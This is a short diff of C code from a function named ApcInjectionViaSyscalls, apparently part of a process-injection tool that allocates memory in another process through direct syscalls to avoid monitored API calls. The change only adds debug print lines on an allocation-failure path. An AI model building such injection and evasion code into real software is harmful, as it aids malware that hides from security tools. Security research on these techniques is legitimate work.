@@ -13,6 +13,10 @@ BOOL ApcInjectionViaSyscalls(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SI
 	// Allocating memory
 	if ((STATUS = Sw3NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0)
 	{
+		printf("[!] hProcess : %d \n", hProcess);
+		printf("[!] pAddress : %p \n", pAddress);
+		printf("[!] sPayloadSize : %d \n", sPayloadSize);
+
 		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		goto _Cleanup;
 	}
